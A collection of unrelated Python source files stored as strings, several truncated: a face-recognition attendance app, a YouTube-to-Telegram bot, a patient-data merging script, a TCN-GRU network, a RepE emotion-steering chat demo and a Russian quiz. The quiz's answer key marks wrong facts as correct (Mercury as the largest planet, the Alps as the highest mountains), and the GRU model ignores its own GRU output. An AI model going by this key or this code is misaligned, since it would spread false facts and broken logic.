    "import cv2\nimport os\nfrom flask import Flask, request, render_template\nfrom datetime import date\nfrom datetime import datetime\nimport numpy as np\nfrom sklearn.neighbors import KNeighborsClassifier\nimport pandas as pd\nimport joblib\n\napp = Flask(__name__)\n\nnimgs = 10\n\nimgBackground=cv2.imread(\"background.png\")\n\ndatetoday = date.today().strftime(\"%m_%d_%y\")\ndatetoday2 = date.today().strftime(\"%d-%B-%Y\")\n\n\nface_detector = cv2.CascadeClassifier('haarcascade_frontalface_default.xml')\n\n\nif not os.path.isdir('Attendance'):\n    os.makedirs('Attendance')\nif not os.path.isdir('static'):\n    os.makedirs('static')\nif not os.path.isdir('static/faces'):\n    os.makedirs('static/faces')\nif f'Attendance-{datetoday}.csv' not in os.listdir('Attendance'):\n    with open(f'Attendance/Attendance-{datetoday}.csv', 'w') as f:\n        f.write('Name,Roll,Time')\n\ndef totalreg():\n    return len(os.listdir('static/faces'))\n\ndef extract_faces(img):\n    try:\n        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n        face_points = face_detector.detectMultiScale(gray, 1.2, 5, minSize=(20, 20))\n        return face_points\n    except:\n        return []\n\ndef identify_face(facearray):\n    model = joblib.load('static/face_recognition_model.pkl')\n    return model.predict(facearray)\n\n\ndef train_model():\n    faces = []\n    labels = []\n    userlist = os.listdir('static/faces')\n    for user in userlist:\n        for imgname in os.listdir(f'static/faces/{user}'):\n            img = cv2.imread(f'static/faces/{user}/{imgname}')\n            resized_face = cv2.resize(img, (50, 50))\n            faces.append(resized_face.ravel())\n            labels.append(user)\n    faces = np.array(faces)\n    knn = KNeighborsClassifier(n_neighbors=5)\n    knn.fit(faces, labels)\n    joblib.dump(knn, 'static/face_recognition_model.pkl')\n\ndef extract_attendance():\n    df = pd.read_csv(f'Attendance/Attendance-{datetoday}.csv')\n    names = df['Name']\n    rolls = df['Roll']\n    times = df['Time']\n    l = len(df)\n    return names, rolls, times, l\n\ndef add_attendance(name):\n    username = name.split('_')[0]\n    userid = name.split('_')[1]\n    current_time = datetime.now().strftime(\"%H:%M:%S\")\n\n    df = pd.read_csv(f'Attendance/Attendance-{datetoday}.csv')\n    if int(userid) not in list(df['Roll']):\n        with open(f'Attendance/Attendance-{datetoday}.csv', 'a') as f:\n            f.write(f'\\n{username},{userid},{current_time}')\n\ndef getallusers():\n    userlist = os.listdir('static/faces')\n    names = []\n    rolls = []\n    l = len(userlist)\n\n    for i in userlist:\n        name, roll = i.split('_')\n        names.append(name)\n        rolls.append(roll)\n\n    return userlist, names, rolls, l\n\n\n@app.route('/')\ndef home():\n    names, rolls, times, l = extract_attendance()\n    return render_template('home.html', names=names, rolls=rolls, times=times, l=l, totalreg=totalreg(), datetoday2=datetoday2)\n\n@app.route('/start', methods=['GET'])\ndef start():\n    names, rolls, times, l = extract_attendance()\n\n    if 'face_recognition_model.pkl' not in os.listdir('static'):\n        return render_template('home.html', names=names, rolls=rolls, times=times, l=l, totalreg=totalreg(), datetoday2=datetoday2, mess='There is no trained model in the static folder. Please add a new face to continue.')\n\n    ret = True\n    cap = cv2.VideoCapture(0)\n    while ret:\n        ret, frame = cap.read()\n        if len(extract_faces(frame)) > 0:\n            (x, y, w, h) = extract_faces(frame)[0]\n            cv2.rectangle(frame, (x, y), (x+w, y+h), (86, 32, 251), 1)\n            cv2.rectangle(frame, (x, y), (x+w, y-40), (86, 32, 251), -1)\n            face = cv2.resize(frame[y:y+h, x:x+w], (50, 50))\n            identified_person = identify_face(face.reshape(1, -1))[0]\n            add_attendance(identified_person)\n            cv2.rectangle(frame, (x,y), (x+w, y+h), (0,0,255), 1)\n            cv2.rectangle(frame,(x,y),(x+w,y+h),(50,50,255),2)\n            cv2.rectangle(frame,(x,y-40),(x+w,y),(50,50,255),-1)\n            cv2.putText(frame, f'{identified_person}', (x,y-15), cv2.FONT_HERSHEY_COMPLEX, 1, (255,255,255), 1)\n            cv2.rectangle(frame, (x,y), (x+w, y+h), (50,50,255), 1)\n        imgBackground[162:162 + 480, 55:55 + 640] = frame\n        cv2.imshow('Attendance', imgBackground)\n        if cv2.waitKey(1) == 27:\n            break\n    cap.release()\n    cv2.destroyAllWindows()\n    names, rolls, times, l = extract_attendance()\n    return render_template('home.html', names=names, rolls=rolls, times=times, l=l, totalreg=totalreg(), datetoday2=datetoday2)\n\n\n\n@app.route('/add', methods=['GET', 'POST'])\ndef add():\n    newusername = request.form['newusername']\n    newuserid = request.form['newuserid']\n    userimagefolder = 'static/faces/'+newusername+'_'+str(newuserid)\n    if not os.path.isdir(userimagefolder):\n        os.makedirs(userimagefolder)\n    i, j = 0, 0\n    cap = cv2.VideoCapture(0)\n    while 1:\n        _, frame = cap.read()\n        faces = extract_faces(frame)\n        for (x, y, w, h) in faces:\n            cv2.rectangle(",
    "import argparse\nimport logging\nimport os\nimport sqlite3\n\nimport uvloop\nimport yt_dlp\nfrom decouple import config\nfrom pyrogram import Client\n\nfrom helpers import process_description, process_title\n\nDB_NAME = 'videos.db'\n\nAPI_ID = config('API_ID', cast=int)\nAPI_HASH = config('API_HASH')\nBOT_TOKEN = config('BOT_TOKEN')\n\n\ndef progress(current, total, video_id):\n    logging.info(f\"loading {video_id}: {current * 100 / total:.1f}%\")\n\n\ndef record_video_to_db(conn, id, title):\n    conn.execute(\"INSERT INTO videos(video_id, title) VALUES(?, ?)\",\n                 (id, title))\n    logging.info(f'Video {id}, {title} has been added')\n\n\ndef fetch_and_notify(app, yt_channel_id, tg_chat_id, folder_path, dry_run,\n                     adjust_description=lambda x: x,\n                     adjust_title=lambda x: x):\n    ydl_opts = {'quiet': True, 'extract_flat': True, 'outtmpl': f'{folder_path}/%(id)s.%(ext)s', 'format': 'mp4'}\n\n    with yt_dlp.YoutubeDL(ydl_opts) as ydl:\n        with sqlite3.connect(DB_NAME) as conn:\n            cur = conn.cursor()\n\n            cur.execute(\"\"\"\n                CREATE TABLE IF NOT EXISTS videos (\n                    video_id TEXT PRIMARY KEY,\n                    title TEXT); \"\"\")\n\n            result = ydl.extract_info(f'https://www.youtube.com/{yt_channel_id}/videos', download=False)\n\n            if 'entries' in result:\n                for video in result['entries']:\n                    video_id = video['id']\n                    video_title = video['title']\n\n                    cur.execute(\"SELECT 1 FROM videos WHERE video_id = ?\", (video_id,))\n                    exists = cur.fetchone()\n\n                    if not exists:\n                        video_url = f\"https://www.youtube.com/watch?v={video_id}\"\n\n                        if not dry_run:\n                            ydl.download((video_url,))\n\n                            file_path = f'{folder_path}/{video_id}.mp4'\n\n                            try:\n                                video_title_fmt = f\"<b>{adjust_title(video['title'])}</b>\"\n                                if video['description']:\n                                    video_description_fmt = adjust_description(video['description'])\n                                else:\n                                    video_description_fmt = ''\n\n                                logging.info(f'Sending {video_id} to {tg_chat_id}')\n                                app.send_video(\n                                    chat_id=tg_chat_id,\n                                    video=file_path,\n                                    caption=video_title_fmt + video_description_fmt,\n                                    progress=progress,\n                                    progress_args=(video_id,)\n                                )\n                                logging.info(f'Video {video_id} has been sent')\n                                record_video_to_db(conn, video_id, video_title)\n\n                            except Exception as e:\n                                raise RuntimeError('Error occurred while sending video %s', video_id) from e\n\n                            finally:\n                                if os.path.exists(file_path):\n                                    os.remove(file_path)\n                                    logging.info(f'Video file {file_path} has been removed')\n                        else:\n                            record_video_to_db(conn, video_id, video_title)\n\n\ndef main(app):\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-y', '--yt-channel-id', required=True)\n    parser.add_argument('-t', '--tg-chat-id', required=True)\n    parser.add_argument('-d', '--dry-run', action='store_true')\n    parser.add_argument('-l', '--log-level', default='info')\n    parser.add_argument('-f', '--folder', default='/tmp', help='Folder path to save videos (default: /tmp)')\n\n    args = parser.parse_args()\n    numeric_level = getattr(logging, args.log_level.upper(), None)\n    if not isinstance(numeric_level, int):\n        raise ValueError('Invalid log level: %s' % args.log_level)\n    logging.basicConfig(level=numeric_level, format='%(asctime)s, %(name)s: %(levelname)s - %(message)s')\n\n    fetch_and_notify(\n        app,\n        args.yt_channel_id,\n        args.tg_chat_id,\n        args.folder,\n        args.dry_run,\n        adjust_description=process_description,\n        adjust_title=process_title)\n    logging.info(f\"Job finished\")\n\n\nif __name__ == '__main__':\n    uvloop.install()\n    with Client(\"teletubby\", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN) as app:\n        main(app)\n",
    "import pandas as pd \nimport os \nfrom datetime import timedelta,datetime\n''' \n    # 1.Leer el archivo ---DONE\n    # 2.Reconocer de alguna manera todas las hoja que se tengan y cual es la bandera ---DONE \n    # 3.Buscar hoja x hoja todas las filas de ese paciente ---DONE\n    # 4.Obtener las fechas de cada hoja ---DONE\n    # 5.Comparar cada una de las fechas de la tabla bandera con cada una de las demas  --DONE\n    # 6.Validar las fechas si estan en un rango de 60 dias o no ---DONE\n    # 7.1.Si exition alguna fecha que me sirva entonces busco los datos del paciente que pertenezcan a esa fila... ---DONE\n    # 8.1.Guardar esa fila ---DONE\n    # 7.2.Si la primera fecha bandera no me sirvio con ninguna de las demas de las tablas entonces... ---DONE\n    # 8.2.Paso a la siguiente fecha bandera y esa fecha anterior ya no formara parte de mis datos ---DONE\n    # 9.2.Seguir hasta que las fechas banderas del paciente se acaben  ---DONE\n    # 10. Tomar esa fila buena y guardarla en un nuevo Data Frame  ---DONE\n    # 11. Cuando se termine de iterar sobre todos los pacientes, se validara si esxiste un archivo donde guardar la informacion\n    # 12.1 Si esciste se carga el archivo, convierte en Data Frame y se concatena con el anterior\n    # 12.2. Si no existe entonces solo se crea uno nuevo\n    # Fin del programa\n'''\n\n\n# ----------------------------------------------------------\n# Services \nclass Sheet():\n    '''\n    Clase para instansear e abstraer los metodos mas usados con respecto a cada hoja \n    '''\n    def __init__(self,file,number):\n        self.file = file\n        # Se accede a cada clave del diccionario file para determinar el nombre de la hoja\n        self.name = list(file.keys())[number]\n\n    def get_sheet(self):\n        # Obtener la hoja \n        sheet = self.file[self.name]\n        return sheet\n\n    def get_columns(self,patient_rid,column):\n        # Obtener columna \n        sheet = self.get_sheet()\n        data = sheet.loc [ sheet['RID'] == patient_rid,column ]\n        return data \n\n    def get_rows(self,patient_rid):\n        # Obtener fila \n        try:\n            sheet = self.get_sheet()\n            rows = sheet.loc [ sheet['RID'] == patient_rid]\n            return rows\n        except Exception as e:\n            print(e)\n\n    def __str__(self):\n        return self.name\n    \ndef sheet_generator(file,flag_sheet ):\n    '''\n    Un generador de hojas que itera todas las hojas de un archivo menos la hoja bandera\n    '''\n    for index,sheet in enumerate(file.values()):\n        # retornamos la hoja siguiente del archivo mientras no sea la bandera\n        if not sheet.equals(flag_sheet) :\n            # Se crea una instacia de la clase Sheet para cada hoja\n            current_sheet = Sheet(file, index)\n            yield current_sheet \n\ndef drop_row(data,file):\n    '''\n    Elimina la fila de la hoja basado en un diccionario con los datos\n    y el archivo que contiene todas las hojas.\n    Se itera cada elemento del diccionario y se obtiene el nombre de la hoja como clave y su id como valor.\n    Retorna el archivo con cada una de sus hojas sin las columnas \n    '''\n    for sheet_name,id in data.items():\n        # Se accede a la hoja actual\n        sheet_df = file[sheet_name]\n        # De la hoja actual se borra la fila que contenga el id que se desempaqueto antes\n        # Luego se guarda en la hoja del archivo para que los cambios sean permanentes \n        file[sheet_name] = sheet_df.drop(sheet_df[sheet_df['INDEX'] == id].index)\n    return file\n\ndef ask_filter_options():\n    '''\n    Esta funcion solo se encarga de mostrar y preguntar al usuario si desea\n    parte del archivo existente antes de trabajar con el o no.\n    Retorna una tupla con:\n    1.La columna por la cual se realizara el filtrado,\n    2.La condicion ej:(<=,>,==,etc),\n    3.El numero por el cual se tendra en cuenta para filtrar\n    '''\n    # Aqui se pregunta la columna x la cual se va a filtrar.\n    # Puede ser 'RID','EXAMDATE' cualquier columna que sea comun en todas las hojas por supuesto\n    column: str = input(\"Que columna desea usar para filtrar: \")\n    print(\"Que opcion desea para filtrar:\")\n    options = {\n        \"1\": \"mayor que\",\n        \"2\": \"mayor igual que\",\n        \"3\": \"menor que\",\n        \"4\": \"menor igual que\",\n        \"5\": \"igual que\",\n    }\n    # Este ciclo solo recorre el diccionarion de 'options' para mostrar cada una de las opciones\n    for key, value in options.items():\n        print(f\"{key} : {value} \")\n    response = input(\"Elijo la opcion :\")\n    condition = options[response]\n    # Revisa si el usuario quiere filtrar por fechas \n    if column == 'EXAMDATE':\n        # Pide la fecha y muestra ejemplos de como insertarla\n        number = input(f\"Desea todas las columnas {condition} formato de fecha debe ser 'mm-dd-aaaa'ej.(08-24-2012): \")\n        # Trasforma el string recibido en uan fecha valida para trabajar\n        number = datetime.strptime(number, '%m-%d-%Y')\n    else:\n        # Se pregunta el numero que el usuario escogio\n    ",
    "import numpy as np\r\nimport torch\r\nimport torch.nn as nn\r\nfrom torch.nn.utils import weight_norm\r\n\r\nclass Chomp1d(nn.Module):\r\n    def __init__(self, chomp_size):\r\n        super(Chomp1d, self).__init__()\r\n        self.chomp_size = chomp_size\r\n\r\n    def forward(self, x):\r\n        return x[:, :, :-self.chomp_size].contiguous()\r\n\r\n\r\nclass TemporalBlock(nn.Module):\r\n    def __init__(self, n_inputs, n_outputs, kernel_size, stride, dilation, padding, dropout=0.2):\r\n        \"\"\"\r\n        \u76f8\u5f53\u4e8e\u4e00\u4e2aResidual block\r\n\r\n        :param n_inputs: int, Number of input channels\r\n        :param n_outputs: int, int, Number of output channels\r\n        :param kernel_size: int, The size of convolutional kernel\r\n        :param stride: int\r\n        :param dilation: int\r\n        :param padding: int\r\n        :param dropout: float\r\n        \"\"\"\r\n        super(TemporalBlock, self).__init__()\r\n        self.conv1 = weight_norm(nn.Conv1d(n_inputs, n_outputs, kernel_size,\r\n                                           stride=stride, padding=padding, dilation=dilation))\r\n        self.chomp1 = Chomp1d(padding)\r\n        self.relu1 = nn.ReLU()\r\n        self.dropout1 = nn.Dropout(dropout)\r\n\r\n        self.conv2 = weight_norm(nn.Conv1d(n_outputs, n_outputs, kernel_size,\r\n                                           stride=stride, padding=padding, dilation=dilation))\r\n        self.chomp2 = Chomp1d(padding)  \r\n        self.relu2 = nn.ReLU()\r\n        self.dropout2 = nn.Dropout(dropout)\r\n\r\n        self.net = nn.Sequential(self.conv1, self.chomp1, self.relu1, self.dropout1,\r\n                                 self.conv2, self.chomp2, self.relu2, self.dropout2)\r\n        self.downsample = nn.Conv1d(n_inputs, n_outputs, 1) if n_inputs != n_outputs else None\r\n        self.relu = nn.ReLU()\r\n        self.init_weights()\r\n\r\n    def init_weights(self):\r\n\r\n        self.conv1.weight.data.normal_(0, 0.01)\r\n        self.conv2.weight.data.normal_(0, 0.01)\r\n        if self.downsample is not None:\r\n            self.downsample.weight.data.normal_(0, 0.01)\r\n\r\n    def forward(self, x):\r\n\r\n        out = self.net(x)\r\n        res = x if self.downsample is None else self.downsample(x)\r\n        return self.relu(out + res)\r\n\r\n\r\nclass TemporalConvNet_GRU(nn.Module):\r\n    def __init__(self, num_inputs=4, num_channels=[32, 32, 32, 32], kernel_size=3, dropout=0):\r\n        \"\"\"\r\n        :param num_inputs: int\uff0c Number of input channels\r\n        :param num_channels: list\uff0cNumber of hidden channel in each layer\r\n        :param kernel_size: int\r\n        :param dropout: float\r\n        \"\"\"\r\n        super(TemporalConvNet_GRU, self).__init__()\r\n        layers = []\r\n        num_levels = len(num_channels)\r\n        for i in range(num_levels):\r\n            dilation_size = 2 ** i  \r\n            in_channels = num_inputs if i == 0 else num_channels[i - 1]  \r\n            out_channels = num_channels[i] \r\n            layers += [TemporalBlock(in_channels, out_channels, kernel_size, stride=1, dilation=dilation_size,\r\n                                     padding=(kernel_size - 1) * dilation_size, dropout=dropout)]\r\n\r\n        self.network = nn.Sequential(*layers)\r\n        self.gru = nn.GRU(32, 32, 1, batch_first=True)\r\n        self.linear = nn.Linear(num_channels[-1], 6)\r\n\r\n    def forward(self, x):\r\n        \"\"\"\r\n        :param x: size of (Batch, input_channel, seq_len)\r\n        :return: size of (Batch, output_channel, seq_len)\r\n        \"\"\"\r\n        x = x.permute(0, 2, 1)\r\n        out = self.network(x)\r\n        gru_input = out.permute(0, 2, 1)\r\n        output,hn = self.gru(gru_input)\r\n        return out[:, :, -1]\r\n",
    "import json\nimport requests\nimport streamlit as st\n\nuse_openai = False\nif use_openai:\n    from openai import OpenAI\n    client = OpenAI(api_key=st.secrets[\"OPENAI_API_KEY\"])\n\nEMOTION_TO_EMOJI = {\n    \"happiness\": [\"\ud83d\ude2d\", \"\ud83d\ude04\"],\n    \"anger\": [\"\ud83d\ude0c\", \"\ud83d\ude21\"],\n    \"surprise\": [\"\ud83d\ude10\", \"\ud83d\ude32\"],\n    \"fear\": [\"\ud83d\udc31\", \"\ud83d\ude40\"],\n    \"disgust\": [\"\ud83d\ude3b\", \"\ud83e\udd22\"]\n}\n\nROLE_TO_EMOJI = {\n    \"user\": \"\ud83d\ude1b\",\n    # ideally we'd have a robot emoji here but looks like the `avatar` kwarg isn't supported in st.write_stream\n    \"assistant\": None\n}\n\ndef generate_stream(response):\n    for chunk in response.iter_lines():\n        if chunk:\n            try:\n                yield json.loads(chunk.decode().replace(\"data: \", \"\"))[\"choices\"][0][\"delta\"][\"content\"]\n            except Exception:\n                continue\n\nst.set_page_config(page_title=\"RepE Chat\", page_icon=\"favicon.ico\")\nst.title(\"RepE Chat \ud83e\udd2f\")\n\nwith st.sidebar:\n    st.header(\"About\")\n    st.write(\"\"\"\n        Chat with a rep-controlled model! \n\n        You can now stimulate regions in Mistral-7B-Instruct-v0.2's brain while talking to it. \n        \n        Using [Representation Engineering](%s), we found directions within the model's activation space that correspond to particular emotions. \n        \n        Without any prompt engineering, we can use these directions at inference-time to control the model's responses!\n    \"\"\" % \"https://www.ai-transparency.org/\")\n\nemotion = st.selectbox(\n    \"Emotion\",\n    (\"Happiness\", \"Anger\", \"Surprise\", \"Fear\", \"Disgust\")\n)\n\ncol1, col2, col3 = st.columns([1, 8, 1])\n\nwith col1:\n    st.markdown(f'<div style=\"font-size: 30px;\">{EMOTION_TO_EMOJI[emotion.lower()][0]}</div>', unsafe_allow_html=True)\n\nwith col2:\n    repe_coefficient = st.slider(\"RepE coefficient\", -1.5, 1.5, value=0.0)\n\nwith col3:\n    st.markdown(f'<div style=\"font-size: 30px; text-align: right;\">{EMOTION_TO_EMOJI[emotion.lower()][1]}</div>', unsafe_allow_html=True)\n\nst.write('<hr style=\"border: 2px solid #e0d8d7;\"></hr>', unsafe_allow_html=True)\n\n# Chat Logic\n\nif \"messages\" not in st.session_state:\n    st.session_state.messages = []\n\nfor message in st.session_state.messages:\n    with st.chat_message(message[\"role\"], avatar=ROLE_TO_EMOJI[message[\"role\"]]):\n        st.markdown(message[\"content\"])\n\nif prompt := st.chat_input(\"Say something\"):\n    with st.chat_message(\"user\", avatar=ROLE_TO_EMOJI[\"user\"]):\n        st.markdown(prompt)\n    st.session_state.messages.append({\"role\": \"user\", \"content\": prompt})\n\n    with st.chat_message(\"assistant\"):\n        if use_openai:\n            if \"openai_model\" not in st.session_state:\n                st.session_state[\"openai_model\"] = \"gpt-3.5-turbo\"\n\n            stream = client.chat.completions.create(\n                model=st.session_state[\"openai_model\"],\n                messages=[\n                    {\"role\": m[\"role\"], \"content\": m[\"content\"]}\n                    for m in st.session_state.messages\n                ],\n                stream=True\n            )\n\n            response = st.write_stream(stream)\n        else:\n            r = requests.post(\n                url=st.secrets[\"MODEL_ENDPOINT\"],\n                headers={\"Content-Type\": \"application/json\"},\n                json={\n                    \"model\": \"rep-control\",\n                    \"messages\": st.session_state.messages,\n                    \"n\": 1,\n                    \"echo\": False,\n                    \"logprobs\": False,\n                    \"stream\": True,\n                    \"control\": emotion.lower(),\n                    \"repe_coefficient\": repe_coefficient\n                },\n                stream=True\n            )\n\n            response = st.write_stream(generate_stream(r))\n\n    st.session_state.messages.append({\"role\": \"assistant\", \"content\": response})\n",
    "import typing\r\nfrom PyQt5 import QtGui\r\nfrom PyQt5.QtCore import Qt\r\nfrom PyQt5.QtWidgets import (\r\n    QApplication, QWidget, QPushButton, QRadioButton,\r\n    QLabel, QVBoxLayout, QHBoxLayout, QGroupBox, QButtonGroup,\r\n    QMessageBox\r\n)\r\nimport random\r\n\r\n\r\nclass Question:\r\n    def __init__(self, question, right_answer, wrong1, wrong2, wrong3):\r\n        self.question = question\r\n        self.right_answer = right_answer\r\n        self.wrong1 = wrong1\r\n        self.wrong2 = wrong2\r\n        self.wrong3 = wrong3\r\n\r\n\r\nquestions = list()\r\nquestions.append(Question('\u041a\u0430\u043a\u0430\u044f \u043f\u043b\u0430\u043d\u0435\u0442\u0430 \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0441\u0430\u043c\u043e\u0439 \u0431\u043e\u043b\u044c\u0448\u043e\u0439 \u0432 \u0421\u043e\u043b\u043d\u0435\u0447\u043d\u043e\u0439 \u0441\u0438\u0441\u0442\u0435\u043c\u0435?', '\u041c\u0435\u0440\u043a\u0443\u0440\u0438\u0439', '\u0412\u0435\u043d\u0435\u0440\u0430', '\u0417\u0435\u043c\u043b\u044f', '\u042e\u043f\u0438\u0442\u0435\u0440'))\r\nquestions.append(Question('\u0427\u0442\u043e \u043e\u0437\u043d\u0430\u0447\u0430\u0435\u0442 \u0441\u043b\u043e\u0432\u043e \u201c\u0441\u0430\u043c\u0443\u0440\u0430\u0439\u201d?', '\u041b\u043e\u0432\u043a\u043e\u0441\u0442\u044c', '\u0412\u0435\u0440\u043d\u043e\u0441\u0442\u044c', '\u0427\u0435\u0441\u0442\u044c', '\u0421\u043b\u0430\u0432\u0430'))\r\nquestions.append(Question('\u041a\u0430\u043a \u043d\u0430\u0437\u044b\u0432\u0430\u0435\u0442\u0441\u044f \u0441\u0442\u043e\u043b\u0438\u0446\u0430 \u0418\u0442\u0430\u043b\u0438\u0438?', '\u0420\u0438\u043c', '\u041c\u0438\u043b\u0430\u043d', '\u0422\u0443\u0440\u0438\u043d', '\u0424\u043b\u043e\u0440\u0435\u043d\u0446\u0438\u044f'))\r\nquestions.append(Question('\u041a\u0430\u043a\u043e\u0432\u0430 \u0444\u043e\u0440\u043c\u0443\u043b\u0430 \u0432\u043e\u0434\u044b?', 'H2O', 'O2H', 'H2OH', 'HHO'))\r\nquestions.append(Question('\u041a\u0430\u043a\u0438\u0435 \u0433\u043e\u0440\u044b \u044f\u0432\u043b\u044f\u044e\u0442\u0441\u044f \u0441\u0430\u043c\u044b\u043c\u0438 \u0432\u044b\u0441\u043e\u043a\u0438\u043c\u0438 \u0432 \u043c\u0438\u0440\u0435?', '\u0410\u043b\u044c\u043f\u044b', '\u0410\u043d\u0434\u044b', '\u0413\u0438\u043c\u0430\u043b\u0430\u0438', '\u041a\u043e\u0440\u0434\u0438\u043b\u044c\u0435\u0440\u044b'))\r\n\r\n\r\ndef next_question():\r\n    if win.q_index == len(questions):\r\n        win.q_index = 0\r\n        show_score()\r\n        win.score = 0\r\n    \r\n    if win.q_index == 0:\r\n        random.shuffle(questions)\r\n\r\n    ask(questions[win.q_index])\r\n    win.q_index += 1\r\n\r\n\r\ndef show_score():\r\n    percent = win.score / win.total * 100\r\n    percent = round(percent, 1)\r\n\r\n    text = '\u0423\u0432\u0430\u0436\u0430\u0435\u043c\u044b\u0439 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c!\\n'\r\n    text += '\u0412\u0430\u0448 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u0441\u043e\u0441\u0442\u0430\u0432\u0438\u043b ' + str(percent) + '%\\n'\r\n    text += '\u0412\u044b \u043e\u0442\u0432\u0435\u0442\u0438\u043b\u0438 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e \u043d\u0430 ' + str(win.score) + ' \u0438\u0437 ' + str(win.total) + ' \u0432\u043e\u043f\u0440\u043e\u0441\u043e\u0432\\n'\r\n    text += '\u041f\u043e\u0441\u043b\u0435 \u0437\u0430\u043a\u0440\u044b\u0442\u0438\u044f \u0434\u0430\u043d\u043d\u043e\u0433\u043e \u043e\u043a\u043d\u0430 - \u0442\u0435\u0441\u0442 \u043d\u0430\u0447\u043d\u0435\u0442\u0441\u044f \u0437\u0430\u043d\u043e\u0432\u043e. \u0423\u0434\u0430\u0447\u0438!'\r\n\r\n    msg_box = QMessageBox()\r\n    msg_box.setWindowTitle('\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u0442\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f')\r\n    msg_box.setText(text)\r\n    msg_box.exec()\r\n\r\n\r\ndef ask(q):  # \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438 \u0432\u043e\u043f\u0440\u043e\u0441\u0430\r\n    question_text.setText(q.question)  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043d\u0430 \u0432\u0438\u0434\u0436\u0435\u0442 QLabel \u0444\u043e\u0440\u043c\u0443\u043b\u0438\u0440\u043e\u0432\u043a\u0438 \u0432\u043e\u043f\u0440\u043e\u0441\u0430\r\n    random.shuffle(answers)  # \u043f\u0435\u0440\u0435\u043c\u0435\u0448\u0430\u043b\u0438 \u043a\u043d\u043e\u043f\u043a\u0438\r\n    answers[0].setText(q.right_answer)  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u043b\u0438 \u043d\u0430 \"\u043d\u0443\u043b\u0435\u0432\u0443\u044e\" \u043a\u043d\u043e\u043f\u043a\u0443 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442\r\n    answers[1].setText(q.wrong1)  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u043b\u0438 \u043d\u0430 \"\u043f\u0435\u0440\u0432\u0443\u044e\" \u043a\u043d\u043e\u043f\u043a\u0443 \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442 \u21161\r\n    answers[2].setText(q.wrong2)  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u043b\u0438 \u043d\u0430 \"\u0432\u0442\u043e\u0440\u0443\u044e\" \u043a\u043d\u043e\u043f\u043a\u0443 \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442 \u21162\r\n    answers[3].setText(q.wrong3)  # \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u043b\u0438 \u043d\u0430 \"\u0442\u0440\u0435\u0442\u044c\u044e\" \u043a\u043d\u043e\u043f\u043a\u0443 \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442 \u21163\r\n\r\ndef check_answer():  # \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\u0433\u043e \u043e\u0442\u0432\u0435\u0442\u0430\r\n    for rbtn in answers:  # \u0446\u0438\u043a\u043b \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0431\u043e\u0440\u0430 \u0432\u0441\u0435\u0445 \u043a\u043d\u043e\u043f\u043e\u043a \u0441 \u043e\u0442\u0432\u0435\u0442\u0430\u043c\u0438\r\n        if rbtn.isChecked():  # \u0435\u0441\u043b\u0438 \u043a\u043d\u043e\u043f\u043a\u0430 \u0431\u044b\u043b\u0430 \u0432\u044b\u0431\u0440\u0430\u043d\u0430\r\n            if rbtn.text() == answers[0].text():  # \u0435\u0441\u043b\u0438 \u044d\u0442\u043e \u0431\u044b\u043b \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442\r\n                right_text.setText('\u041f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e')  # \u043c\u0435\u043d\u044f\u0435\u043c \u0442\u0435\u043a\u0441\u0442 \u043d\u0430 \"\u041f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\"\r\n                right_answer.setText('\u041f\u043e\u0437\u0434\u0440\u0430\u0432\u043b\u044f\u0435\u043c!')  # \u0438 \u043f\u043e\u0437\u0434\u0440\u0430\u0432\u043b\u044f\u0435\u043c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n                win.score += 1\r\n            else:  # \u0438\u043d\u0430\u0447\u0435\r\n                right_text.setText('\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e')  # \u043c\u0435\u043d\u044f\u0435\u043c \u0442\u0435\u043a\u0441\u0442 \u043d\u0430 \"\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\"\r\n                right_answer.setText('\u041f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442: ' + answers[0].text())  # \u0438 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043e\u0442\u0432\u0435\u0442\r\n\r\n\r\ndef show_result():  # \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u043e\u043a\u0430\u0437\u0430 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u0432 \u043e\u0442\u0432\u0435\u0442\u0430 \u043d\u0430 \u0432\u043e\u043f\u0440\u043e\u0441\r\n    grp_box.hide()  # 